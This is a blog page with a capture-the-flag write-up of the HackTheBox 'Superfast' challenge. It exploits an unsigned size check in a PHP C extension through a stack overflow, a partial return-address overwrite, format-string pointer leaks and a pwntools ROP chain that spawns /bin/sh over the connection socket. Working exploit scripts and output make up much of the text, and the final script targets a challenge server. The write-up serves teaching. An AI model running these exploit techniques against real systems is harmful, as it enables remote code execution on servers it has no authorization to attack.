<!DOCTYPE html>
<html lang="en" class="dark-mode">
<head>

    <title>Superfast (HackTheBox)</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=8bb51843de" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=8bb51843de" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=8bb51843de" />

    <link rel="icon" href="https://pwning.tech/content/images/size/w256h256/format/png/2024/01/favicon-1.webp" type="image/png">
    <link rel="canonical" href="https://pwning.tech/superfast/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Pwning Tech">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Superfast (HackTheBox)">
    <meta property="og:description" content="Hey folks. In this write-up, we&#x27;re going to discuss the Superfast challenge in HackTheBox which was part of the HackTheBox Business CTF 2022. We&#x27;re going to perform a single-byte overwrite to bypass ASLR, leak stack pointers, and perform a Return Oriented Programming (ROP) chain. The description of the challenge is:">
    <meta property="og:url" content="https://pwning.tech/superfast/">
    <meta property="og:image" content="https://pwning.tech/content/images/2024/01/publication-cover-casper-1k.webp">
    <meta property="article:published_time" content="2022-11-28T13:21:02.000Z">
    <meta property="article:modified_time" content="2023-02-22T05:51:08.000Z">
    <meta property="article:tag" content="Binary Exploitation">
    <meta property="article:tag" content="HackTheBox challenges">
    <meta property="article:tag" content="ROP chains">
    <meta property="article:tag" content="x64 Assembly">
    <meta property="article:tag" content="BusinessCTF2022">
    <meta property="article:tag" content="ASLR">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Superfast (HackTheBox)">
    <meta name="twitter:description" content="Hey folks. In this write-up, we&#x27;re going to discuss the Superfast challenge in HackTheBox which was part of the HackTheBox Business CTF 2022. We&#x27;re going to perform a single-byte overwrite to bypass ASLR, leak stack pointers, and perform a Return Oriented Programming (ROP) chain. The description of the challenge is:">
    <meta name="twitter:url" content="https://pwning.tech/superfast/">
    <meta name="twitter:image" content="https://pwning.tech/content/images/2023/12/logo_twitter_card.webp">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="notselwyn">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Binary Exploitation, HackTheBox challenges, ROP chains, x64 Assembly, BusinessCTF2022, ASLR">
    <meta name="twitter:site" content="@notselwyn">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Pwning Tech",
        "url": "https://pwning.tech/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://pwning.tech/content/images/2024/01/logo_transparent.svg"
        }
    },
    "author": {
        "@type": "Person",
        "name": "notselwyn",
        "url": "https://pwning.tech/author/notselwyn-2/",
        "sameAs": []
    },
    "headline": "Superfast (HackTheBox)",
    "url": "https://pwning.tech/superfast/",
    "datePublished": "2022-11-28T13:21:02.000Z",
    "dateModified": "2023-02-22T05:51:08.000Z",
    "keywords": "Binary Exploitation, HackTheBox challenges, ROP chains, x64 Assembly, BusinessCTF2022, ASLR",
    "description": "Hey folks. In this write-up, we&#x27;re going to discuss the Superfast challenge in HackTheBox which was part of the HackTheBox Business CTF 2022. We&#x27;re going to perform a single-byte overwrite to bypass ASLR, leak stack pointers, and perform a Return Oriented Programming (ROP) chain. The description of the challenge is:\n\nWe&#x27;ve tracked connections made from an infected workstation back to this server. We believe it is running a C2 checkin interface, the source code of which we aquired from a temporar",
    "mainEntityOfPage": "https://pwning.tech/superfast/"
}
    </script>

    <meta name="generator" content="Ghost 5.75">
    <link rel="alternate" type="application/rss+xml" title="Pwning Tech" href="https://pwning.tech/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="edf92d97a2ffbb07659fa25625" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://pwning.tech/" crossorigin="anonymous"></script>
    
    <link href="https://pwning.tech/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=8bb51843de"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=8bb51843de">
    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism-themes/1.9.0/prism-vsc-dark-plus.min.css" integrity="sha512-ML8rkwYTFNcblPFx+VLgFIT2boa6f8DDP6p6go4+FT0/mJ8DCbCgi6S0UdjtzB3hKCr1zhU+YVB0AHhIloZP8Q==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-highlight/prism-line-highlight.min.css" integrity="sha512-nXlJLUeqPMp1Q3+Bd8Qds8tXeRVQscMscwysJm821C++9w6WtsFbJjPenZ8cQVMXyqSAismveQJc0C1splFDCA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/brands.min.css" integrity="sha512-W/zrbCncQnky/EzL+/AYwTtosvrM+YG/V6piQLSe2HuKS6cmbw89kjYkp3tWFn1dkWV7L1ruvJyKbLz73Vlgfg==" crossorigin="anonymous" referrerpolicy="no-referrer" />

<style>
    .gh-head-menu .nav-twitter a,
    .gh-head-menu .nav-github a {
        font-size: 0 !important;
    }

    .gh-head-menu .nav-twitter a::before,
    .gh-head-menu .nav-github a::before {
        font-family: "Font Awesome 6 Brands";
        display: inline-block;
        font-size: 20px;
        font-style: normal;
        font-weight: normal;
        font-variant: normal;
        text-rendering: auto;
        font-smoothing: antialiased;
    }

    .gh-head-menu .nav-twitter a::before {content: "\f099"}
    .gh-head-menu .nav-github a::before {content: "\f09b"}
</style>

<!-- Tocbot Stylesheet -->
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.css" />

<!-- Tocbot Inline CSS (Specific Adjustments for the Casper Theme) -->
<style>
   
.gh-content {
    position: relative;
 }

.gh-toc > .toc-list {
    position: relative;
    overflow: hidden;
    padding-left: 10px;
}
    
.toc-list-item a {
    text-decoration: none;
}
    
.toc-list-item {  
    list-style: none !important;
}
    
.toc-list {    
    margin-left: 20px;
}

@media (min-width: 1300px) {
     .gh-sidebar {
        position: absolute; 
        top: 0;
        bottom: 0;
        margin-top: 4vmin;
		margin-left: 20px;
        grid-column: 1 / 3;
    }
   
    .gh-toc {
        position: sticky;
        top: 4vmin;
    }
    
    /* compensate ToC margin (required for scrolling) */
    .article-header {
     	padding-bottom: 10px;   
    }
}

.gh-toc .is-active-link::before {
    background-color: var(--ghost-accent-color);
}
</style>

<style>
	/* fix cover image of blogpost (make it inline with the text) */
	.gh-canvas .article-image {
     	grid-column: 3/3;   
    }
</style>

<style>
  /* set font of entire website */
  body { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:400,600), sans-serif; }
  h1 h2 h3 h4 h5 h6 { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:600), sans-serif; }
</style><style>:root {--ghost-accent-color: #e01b24;}</style>

</head>
<body class="post-template tag-binexp tag-htb-challenges tag-rop-chains tag-x64-assembly tag-businessctf2022 tag-aslr tag-hash-import-2023-02-18-16-45 tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 is-head-left-logo has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://pwning.tech">
                        <img src="https://pwning.tech/content/images/2024/01/logo_transparent.svg" alt="Pwning Tech">
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://pwning.tech/">Home</a></li>
    <li class="nav-about-me"><a href="https://pwning.tech/about/">About Me</a></li>
    <li class="nav-twitter"><a href="https://twitter.com/notselwyn/">Twitter</a></li>
    <li class="nav-github"><a href="https://github.com/notselwyn/">Github</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-binexp tag-htb-challenges tag-rop-chains tag-x64-assembly tag-businessctf2022 tag-aslr tag-hash-import-2023-02-18-16-45 tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 featured no-image ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/binexp/">Binary Exploitation</a>
                </span>
                <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
        </div>

        <h1 class="article-title">Superfast (HackTheBox)</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/notselwyn-2/" class="author-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
</a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/notselwyn-2/">notselwyn</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2022-11-28">Nov 28, 2022</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 10 min read</span>
                </div>
            </div>

        </section>
        </div>


    </header>

    <section class="gh-content gh-canvas">
        <p>Hey folks. In this write-up, we're going to discuss the Superfast challenge in HackTheBox which was part of the HackTheBox Business CTF 2022. We're going to perform a <strong>single-byte overwrite</strong> to <strong>bypass ASLR</strong>, <strong>leak stack pointers</strong>, and perform a <strong>Return Oriented Programming </strong>(ROP) chain. The description of the challenge is:</p><blockquote>We've tracked connections made from an infected workstation back to this server. We believe it is running a C2 checkin interface, the source code of which we aquired from a temporarily exposed Git repository several months ago.Apparently the engineers behind it are obsessed with speed, extending their programs with low-level code. We think in their search for speed they might have cut some corners - can you find a way in?</blockquote><p>I really enjoyed pwning this challenge since it has a unique and quite realistic target which I haven't seen before in CTFs.</p><h1 id="index">Index</h1><ul><li>First looks</li><li>Finding primitives</li><li>Developing the ROP chain</li><li>Retrieving the flag</li></ul><h1 id="first-looks">First looks</h1><p>We're given a PHP file with a shared object (.so) written in C, and we're given a source directory for the shared object.</p><figure class="kg-card kg-code-card"><pre><code>.
├── build_docker.sh
├── challenge
│   ├── index.php
│   ├── php_logger.so
│   └── start.sh
├── Dockerfile
└── src
    ├── build.sh
    ├── config.m4
    ├── php_logger.c
    └── php_logger.h

2 directories, 9 files
</code></pre><figcaption>Directories given with the challenge</figcaption></figure><p>In <code>/challenge/start.sh</code> we can see that the challenge code gets bootstrapped using:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">#!/bin/sh
while true; do php -dextension=/php_logger.so -S 0.0.0.0:1337; done</code></pre><figcaption>The content of start.sh</figcaption></figure><p>We can see that PHP loads <code>php_logger.so</code> as a binary extension for the webserver.</p><h1 id="finding-primitives">Finding primitives</h1><p>To start, a vulnerability primitive is a building block of an exploit. A primitive can be bundled with other primitives to achieve a higher impact, like teamwork.</p><h3 id="analysing-indexphp">Analysing index.php</h3><p>The content of index.php (below) checks for a header called <code>Cmd-Key</code> and a parameter <code>cmd</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-php">&lt;?php
if (isset($_SERVER['HTTP_CMD_KEY']) &amp;&amp; isset($_GET['cmd'])) {
	$key = intval($_SERVER['HTTP_CMD_KEY']);
	if ($key &lt;= 0 || $key &gt; 255) {
		http_response_code(400);
	} else {
		log_cmd($_GET['cmd'], $key);
	}
} else {
	http_response_code(400);
}
</code></pre><figcaption>Content of index.php</figcaption></figure><p>One of the most important stages of exploit development is making a reproducing environment. Considering I want to run GDB on <code>php_logger.so</code>, I will run the challenge without Docker. I can run the PHP <code>index.php</code> with <code>php -dextension=./php_logger.so -S 0.0.0.0:1337</code> in <code>/challenge/</code> and I can send the HTTP request using <code>curl '<a href="http://127.0.0.1:1337?cmd=123">http://127.0.0.1:1337/index.php?cmd=123</a>' -H 'Cmd-Key: 123</code>. We can see it succeeds because it returns a 200 status code. </p><figure class="kg-card kg-code-card"><pre><code>[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 Accepted
[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 [200]: GET /?cmd=123
[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 Closing
</code></pre><figcaption>Verbose output of the PHP webserver</figcaption></figure><p>Regarding functionality, we can see that <code>index.php</code> calls <code>log_cmd($cmd, $key)</code> with <code>0 &lt; $key &lt; 256</code>. </p><h3 id="analyzing-phploggerso">Analyzing php_logger.so</h3><p>We can find the source code of <code>php_logger.so</code> in <code>/src/php_logger.c</code>. Under which, we can find the source code of <code>log_cmd()</code> as well. We can see that log_cmd() retrieves function arguments using <code>zend_parse_parameters()</code>. Then, it calls <code>decrypt($cmd, $cmdlen, $key)</code> and - if the return is valid - appends to the <code>/tmp/log</code> file.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">PHP_FUNCTION(log_cmd) {
    char* input;
    zend_string* res;
    size_t size;
    long key;
    if (zend_parse_parameters(ZEND_NUM_ARGS(), "sl", &amp;input, &amp;size, &amp;key) == FAILURE) {
        RETURN_NULL();
    }
    res = decrypt(input, size, (uint8_t)key);
    if (!res) {
        print_message("Invalid input provided\n");
    } else {
        FILE* f = fopen("/tmp/log", "a");
        fwrite(ZSTR_VAL(res), ZSTR_LEN(res), 1, f);
        fclose(f);
    }
    RETURN_NULL();
}
</code></pre><figcaption>Source code of <code>log_cmd()</code></figcaption></figure><p>This function does look safe, so the vulnerability is in <code>decrypt(input, size, key)</code>. This function checks if the size of the command is less than the size of the stack buffer. If it is more it will return, but if it is less it will memcpy() and XOR the buffer with the key. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">zend_string* decrypt(char* buf, size_t size, uint8_t key) {
    char buffer[64] = {0};
    if (sizeof(buffer) - size &gt; 0) {
        memcpy(buffer, buf, size);
    } else {
        return NULL;
    }
    for (int i = 0; i &lt; sizeof(buffer) - 1; i++) {
        buffer[i] ^= key;
    }
    return zend_string_init(buffer, strlen(buffer), 0);
}
</code></pre><figcaption>Source code of <code>decrypt()</code></figcaption></figure><p>We can see that <code>sizeof(buffer) - size &gt; 0</code> is used for the size check. However, <code>sizeof()</code> returns <code>size_t</code>, which is an <strong>unsigned </strong>integer on 32-bit and (in this case) an <strong>unsigned</strong> long on 64-bit. Since we are essentially doing <code>ulong - int &gt; int</code>, we are using an unsigned value as a base value which means the value will wrap around. For example, in this case <code>(uint)0 - (int)1</code> would become <code>2**32-1</code>, instead of <code>-1</code>. A practical example would be the one below. The output of the program is  <code>4294967295 1</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int main()
{
    unsigned int a = 5;
    int b = 6;

    printf("%u %d", a - b, a - b &gt; 0);
}
</code></pre><figcaption>Demo of interaction between (unsigned) integers</figcaption></figure><p>That means that <code>sizeof(buffer) - size &gt; 0)</code> is always true, unless <code>sizeof(buffer) == size</code>. The result of that is a buffer overflow on the stack which we can leverage for a <strong>control flow hijacking primitive</strong>. Using Ghidra - the reverse engineering suite developed by the NSA - we can see that the offset from the buffer to the return address on the stack is 0x98 (152) bytes.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2022/11/image-6.png" class="kg-image" alt loading="lazy" width="722" height="664" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-6.png 600w, https://pwning.tech/content/images/2022/11/image-6.png 722w" sizes="(min-width: 720px) 720px"><figcaption>Stack variable offsets in Ghidra</figcaption></figure><p>However, ASLR is enabled. That means that we cannot guess the library's memory address and hence cannot guess a return address for control flow hijacking. However, the smallest 12 bits of an address are <strong>not random</strong>,<strong> </strong>and thus can we reliably overwrite 12 bits of the return address. Say our normal return address would be <code>0x555555559a1e</code>, in the next program, it could be <code>0x55555123fa1e</code>, but the <code>0xa1e</code> at the end doesn't change, because it's the smallest 12 bits. </p><p>The reason only the first 12 bits of the address don't change, is because they point to 4096 bytes (2 ** 12 bits), which is the page size. The kernel - the manager of ASLR - can't work with addresses smaller than 4096 bytes.   </p><p>Sadly, we can only write bundles of 8 bits (1 byte) at a time considering we're working with a <code>char</code> data type. This means we could only overwrite the <code>0x1e</code> part of the addresses listed above, which narrows our possible return address area. </p><p>In Ghidra, we can figure out that the return address from <code>decrypt()</code> to <code>log_cmd()</code> (without ASLR) is equal <code>0x1014129</code>. This means our scope of possible return addresses ranges from <code>0x1014100</code> to <code>0x10141ff</code>. </p><pre><code class="language-nasm">      0010141e 48 89 ce     MOV       param_2,RCX
      00101421 48 89 c7     MOV       param_1,RAX
      00101424 e8 07 fc     CALL      decrypt
               ff ff
      00101429 48 89 44     MOV       qword ptr [RSP + local_10],RAX
               24 38
      0010142e 48 83 7c     CMP       qword ptr [RSP + local_10],0x0
               24 38 00
</code></pre><p>The code in our return scope is the following. We can see that <code>decrypt()</code> is called, <code>print_message()</code> is called and a bunch of file IO functions. Internally, <code>print_message()</code> is a wrapper for <code>php_printf()</code>: the <a href="https://www.php.net/manual/en/function.printf.php">printf()</a> function in PHP. This is interesting because it outputs to the HTTP response body, which means that we can <strong>leak pointers</strong>.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">    *(undefined4 *)(param_2 + 8) = 1;
  }
  else {
    iVar1 = decrypt(local_20,local_28,(size_t *)(local_30 &amp; 0xff),local_28,(size_t)inlen);
    local_10 = CONCAT44(extraout_var,iVar1);
    if (local_10 == 0) {
      print_message("Invalid input provided\n");
    }
    else {
      local_18 = fopen("/tmp/log","a");
      fwrite((void *)(local_10 + 0x18),*(size_t *)(local_10 + 0x10),1,local_18);
      fclose(local_18);
    }
    *(undefined4 *)(param_2 + 8) = 1;
  }
  return;
}</code></pre><figcaption>C decompilation of our return scope&nbsp;</figcaption></figure><p>However, in order to leak pointers with <code>print_message()</code>, we need to set the RDI register to the printf format string. Fortunately, the RDI register is set to the <code>input</code> argument of <code>decrypt(char* buf, size_t size, uint8_t key)</code> at <code>0x101390</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">      00101385 48 8b 84     MOV       RAX,qword ptr [RSP + local_18]
               24 a0 00 
               00 00
      0010138d 48 89 c6     MOV       inputlen,RAX
      00101390 48 89 cf     MOV       input,param_4
      00101393 e8 e8 fc     CALL      &lt;EXTERNAL&gt;::memcpy
               ff ff
      00101398 48 8b 54     MOV       key,qword ptr [RSP + local_58]
               24 60
</code></pre><figcaption>Assembly code which moves the input into the RDI register</figcaption></figure><p>When I try to fuzz using a script, I receive the following output: </p><figure class="kg-card kg-code-card"><pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@\x81\xd5\x84U\x80~</code></pre><figcaption>Fuzzing output</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">from pwn import xor
import requests

xorkey = 1

s = requests.session()
headers = {"cmd-key": str(xorkey)}

# offset = 152 
payload = b"A"*152 + b"\x40"
content = s.get(b"http://127.0.0.1:1337?cmd="+payload, headers=headers).content
print(xor(content, xorkey))</code></pre><figcaption>Script used to fuzz</figcaption></figure><p>However, when we remove the <code>xor()</code> function call, we can see that the end of the response is an address like <code>b'A\x80\xd4\x85T\x81\x7f'</code>. Using <code>print(hex(u64(content[63:].ljust(8, b'\x00'))))</code> we can translate it to <code>0x7f815485d48041</code>. In order to identify where this leak happens, we can start a GDB server. We leak the address <code>0x7f651305f54041</code> and in GDB we can see with <code>vmmap</code> (in <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>) that this falls under <code>0x7f6513000000     0x7f6513200000 rw-p   200000      0 [anon_7f6513000]</code>. Since this isn't executable it's irrelevant for the ROP chain. </p><figure class="kg-card kg-code-card"><pre><code class="language-py">from pwn import xor, gdb, u64
import requests
import time

gdb.debug(args=['php', '-t', './pwn_superfast/challenge', '-dextension=./pwn_superfast/challenge/php_logger.so', '-S', '0.0.0.0:1337'], gdbscript='continue')
time.sleep(5)

xorkey = 1

s = requests.session()
headers = {"cmd-key": str(xorkey)}

payload = b"A"*152 + b"\x40"
content = s.get(b"http://127.0.0.1:1337?cmd="+payload, headers=headers).content
print(hex(u64(content[63:].ljust(8, b'\x00'))))

time.sleep(999)
</code></pre><figcaption>Script for debugging using GDB</figcaption></figure><p>Since that is useless, we need to find another way to leak addresses. To do that, we can utilize the fact that we're calling <code>printf()</code>. By supplying a payload like <code>%08x %08x %08x %08x</code> we can leak the stack. By trial and error, I found out that we can leak the stack, php_logger.so and the PHP binary using the format string <code>%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_</code>. Using the following payload, we can see the following leaks:</p><figure class="kg-card kg-code-card"><pre><code>php @ 0x55c720a64000
php_logger.so @ 0x7f609866e000
stack @ 0x7fff10fbd480</code></pre><figcaption>Output of the script</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from pwn import xor, u64, gdb
import requests
import time

gdb.debug(args=['php', '-t', './pwn_superfast/challenge', '-dextension=./pwn_superfast/challenge/php_logger.so', '-S', '0.0.0.0:1337'], gdbscript='continue')

time.sleep(3)

xorkey = 0x4
s = requests.session()
headers = {"cmd-key": str(xorkey)}

fmt = b'%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_'
payload = xor(fmt + b"A"*(152 - len(fmt)), xorkey) + b"\x40"
url = b"http://127.1:1337/index.php?cmd=" + payload
print(url)

content = s.get(url, headers=headers).content
addresses = content.split(b"_")

php_base = int(addresses[5], 16)-0x55e240
logger_base = int(addresses[8], 16)-0x1445
stack = int(addresses[0], 16)

print("php @", hex(php_base))
print("php_logger.so @", hex(logger_base))
print("stack @", hex(stack))

time.sleep(999)
</code></pre><figcaption>Payload for leaking addresses</figcaption></figure><p>We have the needed primitives, so we can develop the ROP chain.</p><h1 id="developing-the-rop-chain">Developing the ROP chain</h1><p>Now we can use pwntools' ELF classes in order to make automatic ROP-chains. Using pwntools' ELF class we can see that the <code>execl</code> function in the PLT section of the <code>php</code> binary. This means we can use it to spawn a shell. Our strategy is:</p><ol><li>Leaking the address of the PHP binary and the <code>php_logger.so</code> in memory.</li><li>dup2(4, N) to set stdin, stdout and stderr file descriptors to the TCP connection file descriptor for the webserver. </li><li> execl("/bin/sh", "/bin/sh", 0) to spawn the /bin/sh executable</li></ol><p>We can generate a ROP chain automatically with pwntools:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">rop = ROP(php)

'''
fd[0]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[1]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[2]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[3]      tcp 0.0.0.0:1337 =&gt; 0.0.0.0:0 (listen)
fd[4]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
'''

# set connection socket to stdin/stdout/stderr
rop.call('dup2', [4, 0])
rop.call('dup2', [4, 1])
rop.call('dup2', [4, 2])

binsh = next(php.search(b"/bin/sh\x00"))

rop.call('execl', [binsh, binsh, 0])
print(rop.dump())</code></pre><figcaption>Python code for generating the ROP chain</figcaption></figure><p>Which gives the following ROP chain:</p><figure class="kg-card kg-code-card"><pre><code>0x0000:   0x56244b60816b pop rdi; ret
0x0008:              0x4 [arg0] rdi = 4
0x0010:   0x56244b6043fc pop rsi; ret
0x0018:              0x0 [arg1] rsi = 0
0x0020:   0x56244b601be0 dup2
0x0028:   0x56244b60816b pop rdi; ret
0x0030:              0x4 [arg0] rdi = 4
0x0038:   0x56244b6043fc pop rsi; ret
0x0040:              0x1 [arg1] rsi = 1
0x0048:   0x56244b601be0 dup2
0x0050:   0x56244b60816b pop rdi; ret
0x0058:              0x4 [arg0] rdi = 4
0x0060:   0x56244b6043fc pop rsi; ret
0x0068:              0x2 [arg1] rsi = 2
0x0070:   0x56244b601be0 dup2
0x0078:   0x56244b60816b pop rdi; ret
0x0080:   0x56244bd03fc3 [arg0] rdi = 94713890750403
0x0088:   0x56244b60487c pop rdx; ret
0x0090:              0x0 [arg2] rdx = 0
0x0098:   0x56244b6043fc pop rsi; ret
0x00a0:   0x56244bd03fc3 [arg1] rsi = 94713890750403
0x00a8:   0x56244b6042d0 execl
</code></pre><figcaption>ROP chain generated by pwntools</figcaption></figure><p>As we can see, it does the following:</p><figure class="kg-card kg-code-card"><pre><code>dup(4, 0)
dup(4, 1)
dup(4, 2)
execl("/bin/sh", "/bin/sh", 0)</code></pre><figcaption>C representation of the ROP chain</figcaption></figure><h1 id="retrieving-the-flag">Retrieving the flag</h1><p>I coded the following script to utilize the ROP chain. If we run this, we get a shell on the box. </p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from pwn import xor, u64, gdb, ELF, p64, remote, ROP, context
import requests
import time
import urllib

#gdb.debug(args=['/usr/bin/php', '-t', './pwn_superfast/challenge', '-dextension=./pwn_superfast/challenge/php_logger.so', '-S', '0.0.0.0:1337'], gdbscript='continue')
#time.sleep(5)

target_ip = b"161.35.173.232"
target_port = b"31302"

target_host = b"http://" + target_ip + b":" + target_port

s = requests.session()
headers = {"cmd-key": "1"}

fmt = b'%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_'
payload = xor(fmt + b"A"*(152 - len(fmt)), 1) + b"\x40"

print("[*] sending payload...")
content = s.get(target_host + b"/index.php?cmd=" + payload, headers=headers).content
addresses = content.split(b"_")

print("[*] loading addresses...")
# set context for ROP()
#context.binary = php = ELF('/usr/bin/php', checksec=False)
context.binary = php = ELF('./php', checksec=False)
php.address = int(addresses[5], 16) - php.sym.executor_globals

php_logger = ELF('pwn_superfast/challenge/php_logger.so', checksec=False)
php_logger.address = int(addresses[8], 16)-0x1445
stack = int(addresses[0], 16)

print("[+] php @", hex(php.address))
print("[+] php_logger.so @", hex(php_logger.address))
print("[+] stack @", hex(stack))

rop = ROP(php)

'''
fd[0]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[1]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[2]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[3]      tcp 0.0.0.0:1337 =&gt; 0.0.0.0:0 (listen)
fd[4]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
'''

# set connection socket to stdin/stdout/stderr
rop.call('dup2', [4, 0])
rop.call('dup2', [4, 1])
rop.call('dup2', [4, 2])

binsh = next(php.search(b"/bin/sh\x00"))

rop.call('execl', [binsh, binsh, 0])
print(rop.dump())

payload = b'A'*152 + rop.chain()
http = "GET /index.php?cmd=" + urllib.parse.quote(payload) + " HTTP/1.1\n"
http += "Cmd-Key: 1\n\n"

print("[*] sending payload for shell...")
p = remote(target_ip, int(target_port))
p.send(http.encode())
p.interactive()

time.sleep(999)</code></pre><figcaption>Python script for retrieving the flag</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ python3 script.py
[*] sending payload...
[*] loading addresses...
[+] php @ 0x55da3ce00000
[+] php_logger.so @ 0x7fb906c50000
[+] stack @ 0x7ffee56eddc0
[*] Loaded 327 cached gadgets for './php'
0x0000:   0x55da3d00816b pop rdi; ret
0x0008:              0x4 [arg0] rdi = 4
0x0010:   0x55da3d0043fc pop rsi; ret
0x0018:              0x0 [arg1] rsi = 0
0x0020:   0x55da3d001be0 dup2
0x0028:   0x55da3d00816b pop rdi; ret
0x0030:              0x4 [arg0] rdi = 4
0x0038:   0x55da3d0043fc pop rsi; ret
0x0040:              0x1 [arg1] rsi = 1
0x0048:   0x55da3d001be0 dup2
0x0050:   0x55da3d00816b pop rdi; ret
0x0058:              0x4 [arg0] rdi = 4
0x0060:   0x55da3d0043fc pop rsi; ret
